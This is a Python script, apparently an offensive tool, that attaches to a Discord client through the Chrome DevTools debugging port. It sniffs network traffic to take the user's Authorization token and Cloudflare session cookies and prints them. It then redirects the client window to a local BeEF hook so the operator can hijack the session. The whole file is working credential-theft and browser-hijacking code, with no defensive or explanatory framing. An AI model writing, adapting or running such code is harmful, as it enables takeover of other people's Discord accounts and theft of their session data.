import ctypes, os, subprocess, time

from colorama import Fore

Log = f'{Fore.YELLOW}[LOG]{Fore.WHITE}'
Syn = f'{Fore.RED}[SCN]{Fore.WHITE}'
Con = f'{Fore.MAGENTA}[CON]{Fore.WHITE}'

print(f"{Con} Connecting to wss://127.0.0.1:9223")

try:
    import PyChromeDevTools
except ImportError:
    print ('[-] you need to install PyChromeDevTools')
    print('Trying to install it for you')
    os.system('pip3 install PyChromeDevTools')

chrome = PyChromeDevTools.ChromeInterface(port=9223)

userName = os.environ.get('USERNAME')
print(f"Running on {userName}'s Computer")

print(f"{Log} Restarting Discord")
chrome.Page.reload()
print(f"{Log} Restarted Discord")

chrome.Network.enable()
time.sleep(3)

print(f"{Log} Starting in 5")
time.sleep(1)
print(f"{Log} Starting in 4")
time.sleep(1)
print(f"{Log} Starting in 3")
time.sleep(1)
print(f"{Log} Starting in 2")
time.sleep(1)
print(f"{Log} Starting in 1")
time.sleep(1)
print(f"{Log} Starting in 1")
os.system('clear')
print(f"{Log} Started Logging\n")


matching_event, all_events = chrome.wait_event("Network")
all_events.append(matching_event)


print(f"{Syn} Scanning {len(all_events)} events")
possibleEvents = all_events

authToken = ""
for pEvent in possibleEvents:
    if pEvent is None:
        continue
    if "request" in pEvent["params"] and "Authorization" in pEvent["params"]["request"]["headers"]:
        authToken = pEvent["params"]["request"]["headers"]["Authorization"]
        print(f"{Syn} Grabbed Authorization Token")
        break
if authToken == "":
    print("[ERROR] Error")
    exit()

CookieStore = chrome.Network.getAllCookies()

Cookie_Auth = ""
Cookie_CF = ""

cCount = 0

for cookie in CookieStore["result"]["cookies"]:
    if cookie["name"] == "__cfduid" and cookie["domain"] == ".discordapp.com":
        Cookie_Auth = cookie["value"]
        cCount += 1
        print(f"{Syn} Grabbed __cfruid Auth One")
    else:
        pass

    if cookie["name"] == "__cfruid" and cookie["domain"] == ".discordapp.com":
        Cookie_CF = cookie["value"]
        cCount += 1
        print(f"{Syn} Grabbed __cfruid Auth Two")
    else:
        pass

print('')
print("Token    :  " + authToken)
if Cookie_Auth != "":
    print("Cookie   :  " + Cookie_Auth)

if Cookie_CF != "":
    print("CF Auth  :  " + Cookie_CF)

print(f'\n{Con} Jacking Window...')
chrome.Page.navigate(url="127.0.0.1:80")
print(f'{Con} Check BeeF Contorl Pannel New Connection')
